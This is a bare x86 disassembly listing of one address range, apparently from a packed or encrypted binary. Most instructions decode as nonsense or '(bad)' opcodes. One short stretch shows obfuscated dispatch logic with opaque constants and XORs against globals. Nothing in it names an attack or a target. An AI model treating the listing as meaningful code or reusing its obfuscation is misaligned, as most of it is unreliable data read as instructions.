  405a8c:	dec    BYTE PTR [edi]
  405a8e:	push   esp
  405a8f:	adc    WORD PTR [esi],dx
  405a92:	inc    esp
  405a93:	into   
  405a94:	cwde   
  405a95:	dec    ebp
  405a96:	dec    edx
  405a97:	outs   dx,BYTE PTR ds:[esi]
  405a98:	arpl   WORD PTR [esi],bp
  405a9a:	xor    esi,0xe7ff3b09
  405aa0:	or     al,0x6d
  405aa2:	adc    al,0x4e
  405aa4:	fsubr  QWORD PTR ds:0x714f115d
  405aaa:	lahf   
  405aab:	shr    DWORD PTR ds:0x28dbef50,0x6b
  405ab2:	and    DWORD PTR [ebx-0x74b5cc87],ebp
  405ab8:	jg     0x405a7c
  405aba:	jle    0x405b03
  405abc:	ss (bad) 
  405abe:	mov    ebx,0x252b2c4f
  405ac3:	inc    edi
  405ac4:	xchg   edi,eax
  405ac5:	add    eax,0xf47b99a9
  405aca:	mov    ebx,0xf54885fd
  405acf:	jl     0x405a93
  405ad1:	outs   dx,DWORD PTR ds:[esi]
  405ad2:	mov    al,0x4c
  405ad4:	mov    bl,bh
  405ad6:	test   al,0xc2
  405ad8:	popf   
  405ad9:	mov    dl,0xb8
  405adb:	xchg   edx,eax
  405adc:	dec    edx
  405add:	les    ebx,FWORD PTR [ecx+0x32]
  405ae0:	loop   0x405ae7
  405ae2:	jbe    0x405b3d
  405ae4:	sub    BYTE PTR [esi],dl
  405ae6:	add    al,0x91
  405ae8:	jecxz  0x405b4f
  405aea:	cdq    
  405aeb:	jp     0x405b59
  405aed:	psubw  mm3,QWORD PTR [ebp+eiz*8+0x6a19d6bd]
  405af5:	jb     0x405a7c
  405af7:	sbb    bl,BYTE PTR [ebx-0x32873fac]
  405afd:	test   ebx,ebx
  405aff:	adc    ebx,ebp
  405b01:	xchg   edi,eax
  405b02:	inc    esp
  405b03:	adc    ch,BYTE PTR [eax+0x47]
  405b06:	jnp    0x405b45
  405b08:	jnp    0x405b29
  405b0a:	std    
  405b0b:	rcr    DWORD PTR [ecx-0x7f],cl
  405b0e:	mov    WORD PTR [ebx-0x46],?
  405b11:	sub    BYTE PTR [ebp+0x5b],0x8b
  405b15:	clc    
  405b16:	std    
  405b17:	or     bl,BYTE PTR [eax]
  405b19:	test   BYTE PTR [ebp-0x34],bh
  405b1c:	mov    dh,0xe
  405b1e:	jge    0x405ad7
  405b20:	nop
  405b21:	add    eax,0x190be1e2
  405b26:	int3   
  405b27:	pusha  
  405b28:	ror    BYTE PTR [eax],0x27
  405b2b:	xchg   ebx,eax
  405b2c:	div    DWORD PTR [edx-0x3cb0d963]
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x7a0da195
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c11
  405be0:	std    
  405be1:	pop    eax
  405be2:	cmp    al,0xa4
  405be4:	mov    dl,0xa2
  405be6:	and    ch,BYTE PTR ds:0xc47c1d08
  405bec:	cli    
  405bed:	mul    DWORD PTR [esi+0x29]
  405bf0:	cmp    ebx,ebx
  405bf2:	xor    eax,0x7b6f8491
  405bf7:	jne    0x405bdd
  405bf9:	pushfw 
  405bfb:	(bad)  
  405bfc:	hlt    
  405bfd:	jno    0x405b9c
  405bff:	out    dx,al
  405c00:	xchg   edi,eax
  405c01:	dec    esp
  405c02:	repnz mov ds:0x6c88da9c,eax
  405c08:	push   ebx
  405c09:	mov    ebx,0x80db5670
  405c0e:	sbb    al,0x10
  405c10:	push   eax
  405c11:	(bad)  
  405c12:	mov    esi,0x229e8d17
  405c17:	xor    BYTE PTR [edi],ah
  405c19:	dec    ecx
  405c1a:	dec    edi
  405c1b:	add    al,0x6b
  405c1d:	pop    eax
  405c1e:	adc    cl,BYTE PTR [edi]
  405c20:	mov    al,0x77
  405c22:	pop    ss
  405c23:	jo     0x405bc3
  405c25:	xchg   edi,eax
  405c26:	cmp    BYTE PTR [edx],0xd
  405c29:	push   esi
  405c2a:	(bad)
  405c2d:	(bad)  
  405c2e:	fistp  DWORD PTR [esi]
  405c30:	mov    ebx,0xf6f390f0
  405c35:	fmul   DWORD PTR [ebp-0x5cafa7bb]
  405c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c3c:	retf   
  405c3d:	sub    DWORD PTR [ebx-0x30],0x5e216d9
  405c44:	inc    eax
  405c45:	ds mov edi,0xa975286a
  405c4c:	sbb    al,0x75
  405c4e:	sbb    eax,DWORD PTR [ecx-0x7dc074ad]
  405c54:	mov    DWORD PTR ds:0x70220afe,0xc1210d74
  405c5e:	mov    eax,edx
  405c60:	mov    cl,0xd7
  405c62:	pop    esp
  405c63:	aam    0x90
  405c65:	mov    esi,0xb5a6eb7b
  405c6a:	retf   
  405c6b:	xchg   edx,eax
  405c6c:	pop    eax
  405c6d:	pand   mm7,mm5
  405c70:	mov    WORD PTR [esi-0x3c],?
  405c73:	cmc    
  405c74:	dec    edx
  405c75:	mov    dh,0x83
  405c77:	ficom  DWORD PTR [ebx]
  405c79:	pop    ecx
  405c7a:	jns    0x405c06
  405c7c:	mov    bl,0x5d
  405c7e:	je     0x405c0f
  405c80:	dec    edx
  405c81:	shl    BYTE PTR [edi],1
  405c83:	data16 xor ch,dh
  405c86:	fcmovnbe st,st(4)
  405c88:	mov    eax,ds:0xdb50914e
  405c8d:	mov    WORD PTR [ebp-0x41],ds
  405c90:	or     DWORD PTR ds:0xc681d3f6,ebx
  405c96:	sbb    edx,DWORD PTR [esi]
  405c98:	call   0xc84c0997
  405c9d:	add    dl,bl
  405c9f:	mov    ds:0xfd617aca,al
  405ca4:	dec    esp
  405ca5:	(bad)  
  405ca6:	and    eax,0x3dc1e046
  405cab:	pop    ss
  405cac:	das    
  405cad:	jmp    0x18809f12
  405cb2:	nop
  405cb3:	pop    esp
  405cb4:	adc    DWORD PTR [edi+0x65],edi
  405cb7:	(bad)  
  405cb8:	loop   0x405c51
  405cba:	test   DWORD PTR [edi+edx*2],0x1e1c0d7b
  405cc1:	je     0x405d27
  405cc3:	test   eax,0x9fad913b
  405cc8:	cmp    cl,BYTE PTR [ecx]
  405cca:	add    esi,ecx
  405ccc:	cdq    
  405ccd:	pop    esp
  405cce:	push   cs
  405ccf:	push   ecx
  405cd0:	mov    esi,0xd133f406
  405cd5:	dec    edx
  405cd6:	test   DWORD PTR [ecx],edx
  405cd8:	jp     0x405cec
  405cda:	stos   BYTE PTR es:[edi],al
  405cdb:	(bad)  [eax+0x598b6566]
  405ce1:	in     al,0xcd
  405ce3:	jns    0x405d33
  405ce5:	jle    0x405d65
  405ce7:	add    al,0x80
  405ce9:	mov    ebx,0x32dca379
  405cee:	cmp    al,0x22
  405cf0:	mov    edx,0xb24cc45d
  405cf5:	xchg   ecx,eax
  405cf6:	in     eax,dx
  405cf7:	sub    ch,ah
  405cf9:	repnz or cl,BYTE PTR [eax*4-0x2cbef9c4]
  405d01:	enter  0xf3ed,0xaf
  405d05:	dec    esp
  405d06:	pop    edi
  405d07:	cdq    
  405d08:	test   DWORD PTR [edi+esi*2+0x66],0x75124340
  405d10:	clc    
  405d11:	dec    eax
  405d12:	call   0xb4f0:0x20c048ac
  405d19:	mov    bh,BYTE PTR [edi+0x4]
  405d1c:	jne    0x405cec
  405d1e:	es jno 0x405cb9
  405d21:	dec    ebp
  405d22:	xchg   esi,eax
  405d23:	mov    bh,0xf1
  405d25:	pusha  
  405d26:	or     cl,BYTE PTR [edx]
  405d28:	stos   BYTE PTR es:[edi],al
  405d29:	out    0xfa,eax
  405d2b:	mov    esp,0x305b87a2
  405d30:	ja     0x405d17
  405d32:	mov    ch,0x99
  405d34:	push   ebx
  405d35:	push   ss
  405d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d37:	cli    
  405d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d39:	jo     0x405cbc
  405d3b:	addr16 loope 0x405d50
  405d3e:	or     al,0x1c
  405d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d41:	loop   0x405cf4
  405d43:	das    
  405d44:	aad    0x36
  405d46:	cwde   
  405d47:	pop    ebx
  405d48:	and    BYTE PTR [esi],bh
  405d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d4b:	ret    0xddc8
  405d4e:	xchg   ecx,eax
  405d4f:	daa    
  405d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d51:	and    al,0x10
  405d53:	adc    BYTE PTR [esi],ah
  405d55:	mov    edx,0x73df9b38
  405d5a:	jle    0x405d74
  405d5c:	out    dx,al
  405d5d:	in     al,dx
  405d5e:	test   DWORD PTR [ebx-0x6e],edi
  405d61:	xor    ch,BYTE PTR [ebp-0x53bef393]
  405d67:	xor    eax,0xd400dee5
  405d6c:	sbb    ah,bh
  405d6e:	outs   dx,BYTE PTR ds:[esi]
  405d6f:	inc    eax
  405d70:	aas    
  405d71:	adc    DWORD PTR [edx+edi*8+0x726a3eb4],0x5c6beee6
  405d7c:	and    eax,0xc57cb3dd
  405d81:	pop    ss
  405d82:	push   edx
  405d83:	hlt    
  405d84:	add    BYTE PTR [eax+edi*1-0x28638501],0x86
  405d8c:	xchg   ebp,eax
  405d8d:	add    dl,BYTE PTR [eax]
  405d8f:	fs aad 0x58
  405d92:	scas   eax,DWORD PTR es:[edi]
  405d93:	cmp    BYTE PTR [edi+0xf0c2d1c],ah
  405d99:	push   es
  405d9a:	dec    edx
  405d9b:	call   0x5331:0xede3c344
  405da2:	test   bl,dl
  405da4:	jae    0x405d88
  405da6:	aam    0x29
  405da8:	test   eax,0x55e3f28a
  405dad:	jmp    0x405d7d
  405daf:	ds xchg ecx,eax
  405db1:	retf   0xc9cc
  405db4:	or     ebp,edi
  405db6:	dec    esi
  405db7:	leave  
  405db8:	aad    0x4a
  405dba:	(bad)  
  405dbb:	lahf   
  405dbc:	xchg   esi,eax
  405dbd:	pop    ebx
  405dbe:	push   0x8f2d9caa
  405dc3:	jmp    0x63aa:0x4aa661f6
  405dca:	xchg   edx,eax
  405dcb:	bound  edx,QWORD PTR [eax]
  405dcd:	jbe    0x405d75
  405dcf:	xchg   ecx,eax
  405dd0:	mov    cl,0x2a
  405dd2:	call   0xefdf1065
  405dd7:	ffreep st(5)
  405dd9:	pop    ebp
  405dda:	imul   ecx,DWORD PTR [edx-0x409b9353],0xdee78fcd
  405de4:	rol    DWORD PTR [edi+0x4a],cl
  405de7:	inc    edi
  405de8:	fld    DWORD PTR [ebp+esi*1+0x24]
  405dec:	outs   dx,DWORD PTR ds:[esi]
  405ded:	in     al,0xb1
  405def:	push   ds
  405df0:	rol    DWORD PTR [ebx],0x53
  405df3:	cwde   
  405df4:	sub    ecx,DWORD PTR [ebp+eax*1-0x24]
  405df8:	cs aas 
  405dfa:	daa    
  405dfb:	ins    BYTE PTR es:[edi],dx
  405dfc:	and    BYTE PTR [ebp-0x1247ed8],dh
  405e02:	xor    BYTE PTR [edi+ebp*8+0x77bf5723],al
  405e09:	push   edx
  405e0a:	mov    esp,0x59879e08
  405e0f:	(bad)  
  405e11:	lods   eax,DWORD PTR ds:[esi]
  405e12:	(bad)  
  405e13:	jne    0x405dbf
  405e15:	mov    ebp,0xbd1c4fcc
  405e1a:	pusha  
  405e1b:	dec    ecx
  405e1c:	dec    ebp
  405e1d:	adc    al,0xa9
  405e1f:	sbb    bh,BYTE PTR [ebx-0x64]
  405e22:	cmp    BYTE PTR [ebp+0x47],al
  405e25:	gs mov bl,0x5f
  405e28:	mov    dh,0x31
  405e2a:	push   ebx
  405e2b:	dec    eax
  405e2c:	mov    ds:0x960f1867,eax
  405e31:	scas   eax,DWORD PTR es:[edi]
  405e32:	sti    
  405e33:	jg     0x405e36
  405e35:	fstp   QWORD PTR [ecx+0x62]
  405e38:	fcmovnb st,st(2)
  405e3a:	or     DWORD PTR ds:0xec222bd0,edi
  405e40:	mov    BYTE PTR [ecx-0xfa5f63e],ah
  405e46:	inc    ebp
  405e47:	pop    ebp
  405e48:	push   edi
  405e49:	add    al,0xe1
  405e4b:	test   ecx,0x168e29a0
  405e51:	mov    gs,eax
  405e53:	jge    0x405e8d
  405e55:	xor    ecx,DWORD PTR [eax]
  405e57:	out    dx,eax
  405e58:	sub    ecx,DWORD PTR [edx-0x7d]
  405e5b:	(bad)  
  405e5c:	mov    dh,0xfb
  405e5e:	sub    eax,0x97f3cf92
  405e63:	sub    BYTE PTR [ebp+0x5e],al
  405e66:	cmp    al,0xa7
  405e68:	pop    es
  405e69:	aam    0x88
  405e6b:	(bad)  
  405e6d:	push   esi
  405e6e:	outs   dx,BYTE PTR ds:[esi]
  405e6f:	push   DWORD PTR [edi-0x25]
  405e72:	out    dx,al
  405e73:	js     0x405e38
  405e75:	je     0x405e82
  405e77:	jmp    FWORD PTR [ebx+0x7b]
  405e7a:	test   bh,ah
  405e7c:	lods   eax,DWORD PTR ds:[esi]
  405e7d:	mov    cl,0xeb
  405e7f:	mov    dl,0x8e
  405e81:	stc    
  405e82:	jg     0x405e2d
  405e84:	rcr    DWORD PTR [eax+ebx*2-0x40ec9089],1
  405e8b:	push   ebp
  405e8c:	rcl    DWORD PTR [eax+0x6d],cl
  405e8f:	mov    ah,0x58
  405e91:	and    al,0x8d
  405e93:	jge    0x405eb7
  405e95:	push   edx
  405e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e97:	pushf  
  405e98:	js     0x405e2a
  405e9a:	mov    ss,esp
  405e9c:	js     0x405e9e
  405e9e:	sbb    eax,0xb6b83f27
  405ea3:	sub    ebx,DWORD PTR [eax-0x30cc659c]
  405ea9:	mov    ds:0x22487697,al
  405eae:	in     al,dx
  405eaf:	sbb    BYTE PTR [ebp+0x3f00aaf2],ch
  405eb5:	bound  edx,QWORD PTR [ecx]
  405eb7:	enter  0x4a6c,0x67
  405ebb:	test   esp,ebp
  405ebd:	push   cs
  405ebe:	ins    BYTE PTR es:[edi],dx
  405ebf:	ret    
  405ec0:	into   
  405ec1:	cmp    DWORD PTR [ebx-0x4e],ebp
  405ec4:	fst    QWORD PTR ds:0x6f79223e
  405eca:	cs inc ecx
  405ecc:	sti    
  405ecd:	fild   QWORD PTR ds:0x97df51ad
  405ed3:	enter  0xca9,0x31
  405ed7:	push   ss
  405ed8:	in     al,0x69
  405eda:	jmp    0x1e7eca18
  405edf:	ja     0x405eb1
  405ee1:	inc    ecx
  405ee2:	inc    edx
  405ee3:	or     dl,cl
  405ee5:	idiv   edx
  405ee7:	and    dh,ch
  405ee9:	iret   
  405eea:	(bad)  
  405eeb:	pop    eax
  405eec:	outs   dx,DWORD PTR ds:[esi]
  405eed:	cmp    DWORD PTR [ebx+0x7f397b94],0xffffffec
  405ef4:	xchg   edi,eax
  405ef5:	and    DWORD PTR [ebp+0x5e],ebx
  405ef8:	enter  0x7564,0x9b
  405efc:	test   al,0x34
  405efe:	cmc    
  405eff:	scas   eax,DWORD PTR es:[edi]
  405f00:	out    0x46,al
  405f02:	inc    esi
  405f03:	retf   0xafa4
  405f06:	xchg   ecx,eax
  405f07:	bound  ebp,QWORD PTR [esi-0x57]
  405f0a:	adc    DWORD PTR [esi],edx
  405f0c:	sub    DWORD PTR [ecx-0x20],ecx
  405f0f:	clc    
  405f10:	test   BYTE PTR [ebx],dh
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    ebp,?
  405f27:	sub    al,0xcf
  405f29:	clc    
  405f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	in     eax,0xdb
  405f34:	or     al,0x4b
  405f36:	cmp    eax,0x54703fe1
  405f3b:	jae    0x405f73
  405f3d:	loop   0x405f74
  405f3f:	dec    ebp
  405f40:	xchg   ecx,eax
  405f41:	sub    ch,dh
  405f43:	cmc    
  405f44:	xchg   bh,bh
  405f46:	gs jne 0x405fb0
  405f49:	fild   DWORD PTR [esi+0x23905a1]
  405f4f:	neg    BYTE PTR [esi-0x45]
  405f52:	lds    edi,FWORD PTR ds:0x99727df1
  405f58:	inc    ebp
  405f59:	sub    eax,0x113dbd6e
  405f5e:	adc    BYTE PTR ds:0x27282210,bl
  405f64:	outs   dx,BYTE PTR ds:[esi]
  405f65:	data16 ins BYTE PTR es:[edi],dx
  405f67:	mov    ds:0xf54f1eff,eax
  405f6c:	xchg   ebx,eax
  405f6d:	int    0x58
  405f6f:	ds mov cl,0xfa
  405f72:	mov    edi,0x8692baf8
  405f77:	ins    DWORD PTR es:[edi],dx
  405f78:	sbb    edx,ecx
  405f7a:	sar    ch,0x11
  405f7d:	aas    
  405f7e:	mov    edi,0x7d5e0e0b
  405f83:	aad    0xdf
  405f85:	sub    BYTE PTR [ecx-0x14e4ea53],dl
  405f8b:	stos   BYTE PTR es:[edi],al
  405f8c:	adc    cl,bl
  405f8e:	or     ebp,DWORD PTR [eax-0x1823e7b1]
  405f94:	cmp    ecx,ebx
  405f96:	xchg   BYTE PTR [ecx-0x4e],dh
  405f99:	pop    edx
  405f9a:	pop    ss
  405f9b:	popa   
  405f9c:	retf   
  405f9d:	dec    eax
  405f9e:	in     eax,dx
  405f9f:	inc    edi
  405fa0:	or     al,0xbf
  405fa2:	aas    
  405fa3:	idiv   DWORD PTR [edx-0x29af7ed2]
  405fa9:	dec    edx
  405faa:	xlat   BYTE PTR ds:[ebx]
  405fab:	jl     0x406008
  405fad:	mov    esp,0xa4d400a0
  405fb2:	mov    ebx,0x9cd49ff3
  405fb7:	sub    al,0x33
  405fb9:	mov    bl,0x7b
  405fbb:	test   BYTE PTR [eax-0x447f8735],cl
  405fc1:	xor    bh,cl
  405fc3:	lock pop edx
  405fc5:	mov    edx,0x5d74d094
  405fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fcb:	stos   DWORD PTR es:[edi],eax
  405fcc:	add    eax,0xb0d35f76
  405fd1:	and    ecx,esp
  405fd3:	gs mov edx,0x8710e5e
  405fd9:	pushf  
  405fda:	cmp    DWORD PTR [eax+0x66],ebp
  405fdd:	or     BYTE PTR [eax+0xcd82fe8],dh
  405fe3:	shl    DWORD PTR [ecx-0x47],0x1e
  405fe7:	dec    esp
  405fe8:	add    BYTE PTR [ebp+0x62546f18],0xe7
  405fef:	xchg   esp,eax
  405ff0:	dec    ebp
  405ff1:	xchg   ecx,eax
  405ff2:	add    ecx,DWORD PTR [edx+0x1d5b6182]
  405ff8:	jmp    0x406048
  405ffa:	jo     0x405fa2
  405ffc:	and    DWORD PTR [edx+edx*8-0x26],edi
  406000:	fdivr  st(2),st
  406002:	ins    DWORD PTR es:[edi],dx
  406003:	cmp    edx,eax
  406005:	mov    dh,0x8d
  406007:	push   0xffffff98
  406009:	test   esi,0x77cf107d
  40600f:	or     eax,0xc90977c3
  406014:	fucomip st,st(3)
  406016:	cwde   
  406017:	xor    edx,DWORD PTR [ebp+edi*2+0xc]
  40601b:	out    dx,al
  40601c:	jnp    0x40605f
  40601e:	imul   esi,DWORD PTR [eax+0x489537ab],0x53e5dd42
  406028:	in     al,dx
  406029:	ret    
  40602a:	xchg   DWORD PTR [edi-0x71],edi
  40602d:	imul   ebx,DWORD PTR [edi],0x9ee3de3
  406033:	push   ss
  406034:	popa   
  406035:	or     al,0xd2
  406037:	sub    al,0xb2
  406039:	aas    
  40603a:	lahf   
  40603b:	neg    al
  40603d:	sti    
  40603e:	retf   
  40603f:	or     al,ch
  406041:	cmc    
  406042:	inc    edi
  406043:	push   esi
  406044:	cmp    al,0xde
  406046:	inc    edx
  406047:	rcr    BYTE PTR [edi],1
  406049:	sahf   
  40604a:	lock jbe 0x406031
  40604d:	push   es
  40604e:	add    ebp,eax
  406050:	repnz xchg esp,eax
  406052:	jbe    0x406017
  406054:	(bad)  
  406055:	test   esp,0x3c86f469
  40605b:	imul   edi,DWORD PTR [ebp-0x2c],0x23
  40605f:	rol    BYTE PTR [edi+0x10],cl
  406062:	or     ecx,esp
  406064:	xchg   ebx,eax
  406065:	cmc    
  406066:	and    eax,0x99bf254f
  40606b:	sbb    al,bl
  40606d:	push   esp
  40606e:	retf   
  40606f:	inc    ebx
  406070:	inc    ecx
  406071:	cwde   
  406072:	cli    
  406073:	mov    al,ds:0x89569620
  406078:	(bad)  
  406079:	fistp  DWORD PTR [eax]
  40607b:	int    0x75
  40607d:	jmp    0xdcde:0x8f6eba35
  406084:	bound  esi,QWORD PTR [ebp-0x73]
  406087:	out    0x7d,al
  406089:	das    
  40608a:	sub    bh,BYTE PTR [esp+ecx*4+0x797c720c]
  406091:	xchg   DWORD PTR ds:0x2eb7343c,edx
  406097:	je     0x40607f
  406099:	dec    edi
  40609a:	mov    dl,0x31
  40609c:	test   eax,0x6043577
  4060a1:	shr    DWORD PTR [ebp+edx*2-0x6dc73929],1
  4060a8:	jl     0x406080
  4060aa:	jge    0x406085
  4060ac:	xor    esp,DWORD PTR [eax-0x329b1ce5]
  4060b2:	stos   DWORD PTR es:[edi],eax
  4060b3:	sbb    esp,esi
  4060b5:	add    al,0xc1
  4060b7:	call   0xadc0e8a4
  4060bc:	push   ds
  4060bd:	lods   al,BYTE PTR ds:[esi]
  4060be:	je     0x4060b9
  4060c0:	leave  
  4060c1:	cmp    dh,BYTE PTR [ebp-0x72]
  4060c4:	add    al,0xb
  4060c6:	ret    0xfb52
  4060c9:	gs mov al,0x7c
  4060cc:	lds    edi,FWORD PTR [edx+0x2bd3bf53]
  4060d2:	jno    0x406153
  4060d4:	push   esi
  4060d5:	push   0x3d7907d7
  4060da:	mov    ch,0x1d
  4060dc:	inc    ecx
  4060dd:	adc    edx,DWORD PTR [ebx-0x12]
  4060e0:	(bad)  
  4060e1:	call   0x9de90f08
  4060e6:	and    ah,ch
  4060e8:	adc    eax,0xede3e87
  4060ed:	pop    edi
  4060ee:	outs   dx,DWORD PTR ds:[esi]
  4060ef:	add    al,0x24
  4060f1:	in     al,0xcb
  4060f3:	int    0xef
  4060f5:	add    esp,DWORD PTR [edi+0x7d]
  4060f8:	ds add eax,0x22e099d6
  4060fe:	ret    
  4060ff:	inc    eax
  406100:	inc    esp
  406101:	sub    bh,BYTE PTR [eax+0x29]
  406104:	loop   0x4060c7
  406106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406107:	or     ebp,ecx
  406109:	xor    DWORD PTR [ecx],ebp
  40610b:	or     eax,0x7cedfca1
  406110:	fs xchg ebx,eax
  406112:	push   cs
  406113:	jo     0x406106
  406115:	push   cs
  406116:	in     eax,0xce
  406118:	rol    DWORD PTR ds:0xf1f90644,1
  40611e:	or     eax,0xaa59d710
  406123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406124:	add    al,0x9e
  406126:	lods   al,BYTE PTR ds:[esi]
  406127:	out    0xfe,eax
  406129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40612a:	mov    dh,0x63
  40612c:	outs   dx,DWORD PTR ds:[esi]
  40612d:	imul   edi,DWORD PTR [esi+ebp*1-0x27],0x5b
  406132:	pop    ecx
  406133:	shl    DWORD PTR [esi+0x4a],1
  406136:	ret    0x5edc
  406139:	dec    edx
  40613a:	add    dh,BYTE PTR [ecx+0x33597602]
  406140:	adc    eax,0x15509263
  406145:	xchg   DWORD PTR [edx],eax
  406147:	sbb    dh,BYTE PTR [ebx]
  406149:	std    
  40614a:	jl     0x40618f
  40614c:	rol    DWORD PTR [edx-0x57],0x70
  406150:	adc    DWORD PTR [edi],esi
  406152:	shl    edi,0xa
  406155:	and    ecx,ebp
  406157:	popa   
  406158:	sub    eax,eax
  40615a:	inc    esp
  40615b:	loope  0x4061c5
  40615d:	out    0x83,al
  40615f:	sbb    al,0x23
  406161:	pop    ds
  406162:	xor    esp,ebp
  406164:	enter  0x450b,0x3f
  406168:	inc    eax
  406169:	push   ss
  40616a:	xchg   ebx,eax
  40616b:	pop    ds
  40616c:	push   0x7f
  40616e:	fcom   QWORD PTR [esi-0x7a06d1d7]
  406174:	aaa    
  406175:	xchg   esi,eax
  406176:	call   0xa3957a3d
  40617b:	das    
  40617c:	mov    eax,ds:0x87c1afc6
  406181:	push   esi
  406182:	jo     0x40614e
  406184:	mov    ebp,0xf358f5b9
  406189:	xor    cl,al
  40618b:	aas    
  40618c:	adc    BYTE PTR [edi-0x7e56c2bb],ch
  406192:	and    edx,DWORD PTR [edx+0x55]
  406195:	ins    DWORD PTR es:[edi],dx
  406196:	mov    bh,0x35
  406198:	ins    BYTE PTR es:[edi],dx
  406199:	cmp    DWORD PTR [eax],esp
  40619b:	out    dx,eax
  40619c:	retf   0xebe1
  40619f:	loope  0x4061aa
  4061a1:	inc    esp
  4061a2:	scas   al,BYTE PTR es:[edi]
  4061a3:	iret   
  4061a4:	cdq    
  4061a5:	(bad)  
  4061a6:	stos   DWORD PTR es:[edi],eax
  4061a7:	leave  
  4061a8:	mov    ecx,0x3b2b218f
  4061ad:	loop   0x40614a
  4061af:	imul   edi,DWORD PTR [edi],0x65
  4061b2:	inc    ebp
  4061b3:	imul   BYTE PTR [ecx+eax*4-0x2f]
  4061b7:	xchg   DWORD PTR [ebx],ebp
  4061b9:	lea    edx,[esi]
  4061bb:	inc    esi
  4061bc:	enter  0x3cc1,0x35
  4061c0:	ja     0x406163
  4061c2:	push   eax
  4061c3:	and    DWORD PTR [ecx+0x42ae9d1b],0x76
  4061ca:	add    al,0x5f
  4061cc:	std    
  4061cd:	inc    ecx
  4061ce:	and    eax,0xc0aceeb1
  4061d3:	xchg   esp,eax
  4061d4:	out    dx,al
  4061d5:	leave  
  4061d6:	lds    ebx,FWORD PTR [eax+0x30]
  4061d9:	jne    0x40619c
  4061db:	pop    ss
  4061dc:	xchg   ecx,eax
  4061dd:	push   cs
  4061de:	repz addr16 jmp 0x4061d4
  4061e2:	xchg   ebx,eax
  4061e3:	lock add al,0x36
  4061e6:	sbb    BYTE PTR [esi],bh
  4061e8:	mov    al,0x47
  4061ea:	adc    DWORD PTR [eax],ebx
  4061ec:	sub    eax,0x7994c7a2
  4061f1:	pop    esp
  4061f2:	xchg   ecx,eax
  4061f3:	sub    ecx,DWORD PTR [edi]
  4061f5:	and    eax,0x9f5dffeb
  4061fa:	sti    
  4061fb:	mov    dh,0x88
  4061fd:	test   DWORD PTR [ebp+0x42],ebx
  406200:	cmp    al,0xa2
  406202:	ficom  DWORD PTR [edx-0x75]
  406205:	add    al,0x62
  406207:	and    DWORD PTR [ebp-0x66],edi
  40620a:	mov    ah,BYTE PTR [ecx+edx*1-0x1e1d91fd]
  406211:	(bad)  
  406212:	adc    DWORD PTR [ebx-0x6d],ecx
  406215:	push   ebp
  406216:	xor    ebx,DWORD PTR [ecx-0x29]
  406219:	ret    0x220a
  40621c:	add    dl,BYTE PTR [edi+0x9]
  40621f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406220:	push   ebx
  406221:	mov    WORD PTR ds:[edx],es
  406224:	repnz add DWORD PTR [edi],0x3ab6dee0
  40622b:	xor    al,0xc2
  40622d:	dec    ecx
  40622e:	adc    ch,BYTE PTR [ebx+0x13]
  406231:	sub    eax,0x31a6951c
  406236:	pusha  
  406237:	mov    bh,0xbf
  406239:	dec    eax
  40623a:	fs clc 
  40623c:	and    DWORD PTR [eax-0x1f],eax
  40623f:	sar    DWORD PTR [ecx],cl
  406241:	lods   al,BYTE PTR ds:[esi]
  406242:	jp     0x406227
  406244:	cwde   
  406245:	arpl   si,sp
  406247:	jle    0x40621f
  406249:	inc    esp
  40624a:	mov    ds:0x25bfa073,eax
  40624f:	pop    esp
  406250:	dec    ecx
  406251:	jecxz  0x4061ea
  406253:	sbb    DWORD PTR [ebx+0x298cb2f2],0x9d30657f
  40625d:	ja     0x4062a2
  40625f:	pusha  
  406260:	rep ins BYTE PTR es:[edi],dx
  406262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406263:	stos   DWORD PTR es:[edi],eax
  406264:	xor    esi,eax
